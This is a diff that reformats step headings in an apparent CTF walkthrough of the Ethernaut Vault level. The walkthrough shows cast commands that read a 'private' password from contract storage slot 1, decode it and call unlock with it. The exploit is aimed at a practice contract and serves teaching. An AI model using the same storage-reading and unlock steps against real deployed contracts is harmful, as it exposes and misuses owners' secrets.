@@ -38,7 +38,7 @@ Nothing on the blockchain is private, not even private variables. We can probe t
 So to find the value of password we inspect storage slot 1.
 
 ### Walkthrough
-1. inspect the first storage slot of the vault 
+##### 1. inspect the first storage slot of the vault 
 ```console
 cast storage $LEVEL_ADDRESS 1
 ```
@@ -47,7 +47,7 @@ output
 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
 ```
 
-2. for fun lets see the hex data in utf8 format
+##### 2. for fun lets see the hex data in utf8 format
 ```console
 cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
 ```
@@ -56,7 +56,7 @@ output
 A very strong secret password :)
 ```
 
-3. call the "unlock(bytes32)" function with the extracted password
+##### 3. call the "unlock(bytes32)" function with the extracted password
 ```console
 cast send $LEVEL_ADDRESS "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --private-key $PRIVATE_KEY 
 ```
